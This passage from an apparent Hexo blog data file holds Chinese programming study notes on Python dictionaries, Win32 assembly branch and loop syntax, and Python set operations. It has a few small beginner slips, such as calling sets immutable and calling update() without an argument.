class=\"number\">3.</span>字典是可以原处修改的对象，存储的是对象的引用。</span><br><span class=\"line\"><span class=\"number\">4.</span>强制类型转换：dict()</span><br><span class=\"line\"><span class=\"number\">5.</span>常量：</span><br><span class=\"line\">\tdict=&#123;<span class=\"string\">'k1'</span>:<span class=\"string\">'v1'</span>&#125;</span><br><span class=\"line\"><span class=\"number\">6.</span>操作：</span><br><span class=\"line\">\t查：</span><br><span class=\"line\">\t\t索引通过键索引，而不是下标：dict[<span class=\"string\">'key'</span>]</span><br><span class=\"line\">\t\tget() <span class=\"comment\">#根据键返回值,对比索引差别在于取不存在的键不会报错。</span></span><br><span class=\"line\">\t\titems()  <span class=\"comment\">#列出所有键值对</span></span><br><span class=\"line\">\t\tkeys()   <span class=\"comment\">#列出所有键名列表</span></span><br><span class=\"line\">\t\tvalues() <span class=\"comment\">#列出所有值列表</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t增：</span><br><span class=\"line\">\t\t索引不存在的键并赋值是新增一个元素。</span><br><span class=\"line\">\t\tupdate() <span class=\"comment\">#用一个字典新增到另一个字典中。（原处修改，同列表的extend()）</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t改：</span><br><span class=\"line\">\t\t索引已存在的键并赋新值是修改。</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t删：</span><br><span class=\"line\">\t\tpop()  <span class=\"comment\">#删除指定key的项并返回值。（原处修改）</span></span><br><span class=\"line\">\t\tpopitem() <span class=\"comment\">#随意删除一个项并返回键值。（原处修改）</span></span><br><span class=\"line\">\t\tclear()\t <span class=\"comment\">#清空字典</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">del</span> dict[<span class=\"string\">'key'</span>] <span class=\"comment\">#删除索引。（原处修改）</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"number\">6.</span>遍历字典：</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dict:</span><br><span class=\"line\">\t\t\t print(k,dict[<span class=\"string\">'k'</span>])</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> dict.items():</span><br><span class=\"line\">\t\t\tprint(k,v)</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dict.keys():</span><br><span class=\"line\">\t\t\tprint(k,dict[<span class=\"string\">'k'</span>])</span><br></pre></td></tr></table></figure>"},{"title":"Win32编程基础Chapter 5：分支和循环","date":"2019-04-02T01:01:49.000Z","_content":"\n#### 0x00 分支语句\n\n语法格式：\n\n```assembly\n.if 条件表达式\n\tcode\n\n[.elseif 条件表达式]\n\tcode\n\n[.else]\n\tcode\n\n.endif\n```\n\n<!-- more -->\n\n源程序：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402090659.png)\n\n编译后反编译：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402091215.png)\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402091227.png)\n\n#### 0x01 循环语句\n\n语法格式：\n\n```assembly\n.while 条件表达式\n\tcode\n\t[.break [.if 条件表达式]]\n\t[.continue]\n.endw\n```\n\n源程序：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402091959.png)\n\n编译后反汇编：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402092028.png)","source":"_posts/04-win32编程基础Chapter-5.md","raw":"---\ntitle: Win32编程基础Chapter 5：分支和循环\ndate: 2019-04-02 09:01:49\ntags:\n\t- Win32\n\t- 汇编语言\ncategories: Win32\n---\n\n#### 0x00 分支语句\n\n语法格式：\n\n```assembly\n.if 条件表达式\n\tcode\n\n[.elseif 条件表达式]\n\tcode\n\n[.else]\n\tcode\n\n.endif\n```\n\n<!-- more -->\n\n源程序：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402090659.png)\n\n编译后反编译：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402091215.png)\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402091227.png)\n\n#### 0x01 循环语句\n\n语法格式：\n\n```assembly\n.while 条件表达式\n\tcode\n\t[.break [.if 条件表达式]]\n\t[.continue]\n.endw\n```\n\n源程序：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402091959.png)\n\n编译后反汇编：\n\n![](04-win32编程基础Chapter-5\\QQ截图20190402092028.png)","slug":"04-win32编程基础Chapter-5","published":1,"updated":"2019-04-02T01:26:21.610Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83jw000w7or0olbikrn7","content":"<h4 id=\"0x00-分支语句\"><a href=\"#0x00-分支语句\" class=\"headerlink\" title=\"0x00 分支语句\"></a>0x00 分支语句</h4><p>语法格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.if 条件表达式</span><br><span class=\"line\">\tcode</span><br><span class=\"line\"></span><br><span class=\"line\">[.elseif 条件表达式]</span><br><span class=\"line\">\tcode</span><br><span class=\"line\"></span><br><span class=\"line\">[.else]</span><br><span class=\"line\">\tcode</span><br><span class=\"line\"></span><br><span class=\"line\">.endif</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>源程序：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402090659.png\" alt></p>\n<p>编译后反编译：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402091215.png\" alt></p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402091227.png\" alt></p>\n<h4 id=\"0x01-循环语句\"><a href=\"#0x01-循环语句\" class=\"headerlink\" title=\"0x01 循环语句\"></a>0x01 循环语句</h4><p>语法格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.while 条件表达式</span><br><span class=\"line\">\tcode</span><br><span class=\"line\">\t[.break [.if 条件表达式]]</span><br><span class=\"line\">\t[.continue]</span><br><span class=\"line\">.endw</span><br></pre></td></tr></table></figure>\n<p>源程序：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402091959.png\" alt></p>\n<p>编译后反汇编：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402092028.png\" alt></p>\n","site":{"data":{}},"excerpt":"<h4 id=\"0x00-分支语句\"><a href=\"#0x00-分支语句\" class=\"headerlink\" title=\"0x00 分支语句\"></a>0x00 分支语句</h4><p>语法格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.if 条件表达式</span><br><span class=\"line\">\tcode</span><br><span class=\"line\"></span><br><span class=\"line\">[.elseif 条件表达式]</span><br><span class=\"line\">\tcode</span><br><span class=\"line\"></span><br><span class=\"line\">[.else]</span><br><span class=\"line\">\tcode</span><br><span class=\"line\"></span><br><span class=\"line\">.endif</span><br></pre></td></tr></table></figure>","more":"<p>源程序：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402090659.png\" alt></p>\n<p>编译后反编译：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402091215.png\" alt></p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402091227.png\" alt></p>\n<h4 id=\"0x01-循环语句\"><a href=\"#0x01-循环语句\" class=\"headerlink\" title=\"0x01 循环语句\"></a>0x01 循环语句</h4><p>语法格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.while 条件表达式</span><br><span class=\"line\">\tcode</span><br><span class=\"line\">\t[.break [.if 条件表达式]]</span><br><span class=\"line\">\t[.continue]</span><br><span class=\"line\">.endw</span><br></pre></td></tr></table></figure>\n<p>源程序：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402091959.png\" alt></p>\n<p>编译后反汇编：</p>\n<p><img src=\"/2019/04/02/04-win32编程基础Chapter-5/QQ截图20190402092028.png\" alt></p>"},{"title":"Python基础学习系列Chapter 5：集合","date":"2019-03-19T08:27:06.000Z","_content":"\n### 0x00 集合概述\n\n- 不可变对象的无序集合\n- 存储的对象是唯一的，具有抗重性\n- 属于可变对象类型\n- 集合的操作都是产生的新的对象。所以intersection_update()、difference_update()、symmetric_difference_update()操作实际都是重新赋值。\n- 集合类似无值的字典\n\n<!-- more -->\n\n### 0x01 集合创建\n\n```python\nset1={1,2,3,'a'}\nset1=set([1,2,3,'a']) \n```\n\n- 只能储存不可变对象\n- 向set()传入一个序列或可迭代对象创建\n\n### 0x02 集合操作\n\n#### **交集 &**\n\n##### intersection()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.intersection(set2)    #{1,3,5}\nset1 & set2                #{1,3,5}\n```\n\n##### intersection_update() #用交集更新\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.intersection_update(set2)    #set1变为{1，3，5}\n```\n\n##### isdisjoint() #无交集True，有交集False\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.isdisjoint(set2)    #False\n```\n\n#### **并集 |** \n\n##### union()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.union(set2)   #{1,2,3,4,5,7}\nset1 | set2        #{1,2,3,4,5,7}\n```\n\n- 集合是不可变的，操作不会影响set1，set2\n\n#### **差集 -**\n\n##### difference()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.difference(set2)   #set1有，set2无，{2,4}\nset1 - set2             #set1有，set2无，{2,4}\n\nset2.difference(set1)   #set2有，set1无，{7}\nset2 - set1             #set2有，set1无，{7}\n```\n\n##### difference_update() #取差集并更新\n\n#### **对称差集 ^**\n\n##### symmetric_difference() #不包含交集后的并集\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.symmetric_difference(set2)  #{2,4,7}\nset1 ^ set2                      #{2,4,7}\n```\n\n##### symmetric_difference_update()\n\n#### **父集、子集**\n\n##### issuperset()、issubset()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5}\n\nset1.issuperset(set2)   #True\nset2.issubset(set1)     #True\n```\n\n#### **增相关**\n\n##### add() #增加一个\n\n```python\nset1 = {1,3,5}\n\nset1.add(7)\n```\n\n##### updata() #合并\n\n```python\nset1={1,2}\nset2={3,4}\n\nset1.update()\n```\n\n- 原处改变\n\n#### **删相关**\n\n##### remove() #删除一个元素\n\n```python\nset1={1,2,3}\n\nset1.remove(2)\n```\n\n##### discard() #删除一个元素\n\n```python\nset1={1,2,3}\n\nset1.discard(2)\n```\n\n- remove与discard区别在于，remove删除一个不存在元素会报错，而discard不会。\n\n##### pop() #随机删除一个元素并返回该元素","source":"_posts/04python基础学习系列之集合.md","raw":"---\ntitle: Python基础学习系列Chapter 5：集合\ndate: 2019-03-19 16:27:06\ntags: \n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n### 0x00 集合概述\n\n- 不可变对象的无序集合\n- 存储的对象是唯一的，具有抗重性\n- 属于可变对象类型\n- 集合的操作都是产生的新的对象。所以intersection_update()、difference_update()、symmetric_difference_update()操作实际都是重新赋值。\n- 集合类似无值的字典\n\n<!-- more -->\n\n### 0x01 集合创建\n\n```python\nset1={1,2,3,'a'}\nset1=set([1,2,3,'a']) \n```\n\n- 只能储存不可变对象\n- 向set()传入一个序列或可迭代对象创建\n\n### 0x02 集合操作\n\n#### **交集 &**\n\n##### intersection()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.intersection(set2)    #{1,3,5}\nset1 & set2                #{1,3,5}\n```\n\n##### intersection_update() #用交集更新\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.intersection_update(set2)    #set1变为{1，3，5}\n```\n\n##### isdisjoint() #无交集True，有交集False\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.isdisjoint(set2)    #False\n```\n\n#### **并集 |** \n\n##### union()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.union(set2)   #{1,2,3,4,5,7}\nset1 | set2        #{1,2,3,4,5,7}\n```\n\n- 集合是不可变的，操作不会影响set1，set2\n\n#### **差集 -**\n\n##### difference()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.difference(set2)   #set1有，set2无，{2,4}\nset1 - set2             #set1有，set2无，{2,4}\n\nset2.difference(set1)   #set2有，set1无，{7}\nset2 - set1             #set2有，set1无，{7}\n```\n\n##### difference_update() #取差集并更新\n\n#### **对称差集 ^**\n\n##### symmetric_difference() #不包含交集后的并集\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5,7}\n\nset1.symmetric_difference(set2)  #{2,4,7}\nset1 ^ set2                      #{2,4,7}\n```\n\n##### symmetric_difference_update()\n\n#### **父集、子集**\n\n##### issuperset()、issubset()\n\n```python\nset1 = {1,2,3,4,5}\nset2 = {1,3,5}\n\nset1.issuperset(set2)   #True\nset2.issubset(set1)     #True\n```\n\n#### **增相关**\n\n##### add() #增加一个\n\n```python\nset1 = {1,3,5}\n\nset1.add(7)\n```\n\n##### updata() #合并\n\n```python\nset1={1,2}\nset2={3,4}\n\nset1.update()\n```\n\n- 原处改变\n\n#### **删相关**\n\n##### remove() #删除一个元素\n\n```python\nset1={1,2,3}\n\nset1.remove(2)\n```\n\n##### discard() #删除一个元素\n\n```python\nset1={1,2,3}\n\nset1.discard(2)\n```\n\n- remove与discard区别在于，remove删除一个不存在元素会报错，而discard不会。\n\n##### pop() #随机删除一个元素并返回该元素","slug":"04python基础学习系列之集合","published":1,"updated":"2019-03-29T07:21:08.392Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83jz000z7or0swmbw6c9","content":"<h3 id=\"0x00-集合概述\"><a href=\"#0x00-集合概述\" class=\"headerlink\" title=\"0x00 集合概述\"></a>0x00 集合概述</h3><ul>\n<li>不可变对象的无序集合</li>\n<li>存储的对象是唯一的，具有抗重性</li>\n<li>属于可变对象类型</li>\n<li>集合的操作都是产生的新的对象。所以intersection_update()、difference_update()、symmetric_difference_update()操作实际都是重新赋值。</li>\n<li>集合类似无值的字典</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"0x01-集合创建\"><a href=\"#0x01-集合创建\" class=\"headerlink\" title=\"0x01 集合创建\"></a>0x01 集合创建</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">'a'</span>&#125;</span><br><span class=\"line\">set1=set([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">'a'</span>])</span><br></pre></td></tr></table></figure>\n<ul>\n<li>只能储存不可变对象</li>\n<li>向set()传入一个序列或可迭代对象创建</li>\n</ul>\n<h3 id=\"0x02-集合操作\"><a href=\"#0x02-集合操作\" class=\"headerlink\" title=\"0x02 集合操作\"></a>0x02 集合操作</h3><h4 id=\"交集-amp\"><a href=\"#交集-amp\" class=\"headerlink\" title=\"交集 &amp;\"></a><strong>交集 &amp;</strong></h4><h5 id=\"intersection\"><a href=\"#intersection\" class=\"headerlink\" title=\"intersection()\"></a>intersection()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.intersection(set2)    <span class=\"comment\">#&#123;1,3,5&#125;</span></span><br><span class=\"line\">set1 &amp; set2                <span class=\"comment\">#&#123;1,3,5&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"intersection-update-用交集更新\"><a href=\"#intersection-update-用交集更新\" class=\"headerlink\" title=\"intersection_update() #用交集更新\"></a>intersection_update() #用交集更新</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.intersection_update(set2)    <span class=\"comment\">#set1变为&#123;1，3，5&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isdisjoint-无交集True，有交集False\"><a href=\"#isdisjoint-无交集True，有交集False\" class=\"headerlink\" title=\"isdisjoint() #无交集True，有交集False\"></a>isdisjoint() #无交集True，有交集False</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.isdisjoint(set2)    <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"并集\"><a href=\"#并集\" class=\"headerlink\" title=\"并集 |\"></a><strong>并集 |</strong></h4><h5 id=\"union\"><a href=\"#union\" class=\"headerlink\" title=\"union()\"></a>union()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.union(set2)   <span class=\"comment\">#&#123;1,2,3,4,5,7&#125;</span></span><br><span class=\"line\">set1 | set2        <span class=\"comment\">#&#123;1,2,3,4,5,7&#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>集合是不可变的，操作不会影响set1，set2</li>\n</ul>\n<h4 id=\"差集\"><a href=\"#差集\" class=\"headerlink\" title=\"差集 -\"></a><strong>差集 -</strong></h4><h5 id=\"difference\"><a href=\"#difference\" class=\"headerlink\" title=\"difference()\"></a>difference()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.difference(set2)   <span class=\"comment\">#set1有，set2无，&#123;2,4&#125;</span></span><br><span class=\"line\">set1 - set2             <span class=\"comment\">#set1有，set2无，&#123;2,4&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">set2.difference(set1)   <span class=\"comment\">#set2有，set1无，&#123;7&#125;</span></span><br><span class=\"line\">set2 - set1             <span class=\"comment\">#set2有，set1无，&#123;7&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"difference-update-取差集并更新\"><a href=\"#difference-update-取差集并更新\" class=\"headerlink\" title=\"difference_update() #取差集并更新\"></a>difference_update() #取差集并更新</h5><h4 id=\"对称差集\"><a href=\"#对称差集\" class=\"headerlink\" title=\"对称差集 ^\"></a><strong>对称差集 ^</strong></h4><h5 id=\"symmetric-difference-不包含交集后的并集\"><a href=\"#symmetric-difference-不包含交集后的并集\" class=\"headerlink\" title=\"symmetric_difference() #不包含交集后的并集\"></a>symmetric_difference() #不包含交集后的并集</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.symmetric_difference(set2)  <span class=\"comment\">#&#123;2,4,7&#125;</span></span><br><span class=\"line\">set1 ^ set2                      <span class=\"comment\">#&#123;2,4,7&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"symmetric-difference-update\"><a href=\"#symmetric-difference-update\" class=\"headerlink\" title=\"symmetric_difference_update()\"></a>symmetric_difference_update()</h5><h4 id=\"父集、子集\"><a href=\"#父集、子集\" class=\"headerlink\" title=\"父集、子集\"></a><strong>父集、子集</strong></h4><h5 id=\"issuperset-、issubset\"><a href=\"#issuperset-、issubset\" class=\"headerlink\" title=\"issuperset()、issubset()\"></a>issuperset()、issubset()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.issuperset(set2)   <span class=\"comment\">#True</span></span><br><span class=\"line\">set2.issubset(set1)     <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"增相关\"><a href=\"#增相关\" class=\"headerlink\" title=\"增相关\"></a><strong>增相关</strong></h4><h5 id=\"add-增加一个\"><a href=\"#add-增加一个\" class=\"headerlink\" title=\"add() #增加一个\"></a>add() #增加一个</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.add(<span class=\"number\">7</span>)</span><br></pre></td></tr></table></figure>\n<h5 id=\"updata-合并\"><a href=\"#updata-合并\" class=\"headerlink\" title=\"updata() #合并\"></a>updata() #合并</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>&#125;</span><br><span class=\"line\">set2=&#123;<span class=\"number\">3</span>,<span class=\"number\">4</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.update()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>原处改变</li>\n</ul>\n<h4 id=\"删相关\"><a href=\"#删相关\" class=\"headerlink\" title=\"删相关\"></a><strong>删相关</strong></h4><h5 id=\"remove-删除一个元素\"><a href=\"#remove-删除一个元素\" class=\"headerlink\" title=\"remove() #删除一个元素\"></a>remove() #删除一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.remove(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<h5 id=\"discard-删除一个元素\"><a href=\"#discard-删除一个元素\" class=\"headerlink\" title=\"discard() #删除一个元素\"></a>discard() #删除一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.discard(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>remove与discard区别在于，remove删除一个不存在元素会报错，而discard不会。</li>\n</ul>\n<h5 id=\"pop-随机删除一个元素并返回该元素\"><a href=\"#pop-随机删除一个元素并返回该元素\" class=\"headerlink\" title=\"pop() #随机删除一个元素并返回该元素\"></a>pop() #随机删除一个元素并返回该元素</h5>","site":{"data":{}},"excerpt":"<h3 id=\"0x00-集合概述\"><a href=\"#0x00-集合概述\" class=\"headerlink\" title=\"0x00 集合概述\"></a>0x00 集合概述</h3><ul>\n<li>不可变对象的无序集合</li>\n<li>存储的对象是唯一的，具有抗重性</li>\n<li>属于可变对象类型</li>\n<li>集合的操作都是产生的新的对象。所以intersection_update()、difference_update()、symmetric_difference_update()操作实际都是重新赋值。</li>\n<li>集合类似无值的字典</li>\n</ul>","more":"<h3 id=\"0x01-集合创建\"><a href=\"#0x01-集合创建\" class=\"headerlink\" title=\"0x01 集合创建\"></a>0x01 集合创建</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">'a'</span>&#125;</span><br><span class=\"line\">set1=set([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">'a'</span>])</span><br></pre></td></tr></table></figure>\n<ul>\n<li>只能储存不可变对象</li>\n<li>向set()传入一个序列或可迭代对象创建</li>\n</ul>\n<h3 id=\"0x02-集合操作\"><a href=\"#0x02-集合操作\" class=\"headerlink\" title=\"0x02 集合操作\"></a>0x02 集合操作</h3><h4 id=\"交集-amp\"><a href=\"#交集-amp\" class=\"headerlink\" title=\"交集 &amp;\"></a><strong>交集 &amp;</strong></h4><h5 id=\"intersection\"><a href=\"#intersection\" class=\"headerlink\" title=\"intersection()\"></a>intersection()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.intersection(set2)    <span class=\"comment\">#&#123;1,3,5&#125;</span></span><br><span class=\"line\">set1 &amp; set2                <span class=\"comment\">#&#123;1,3,5&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"intersection-update-用交集更新\"><a 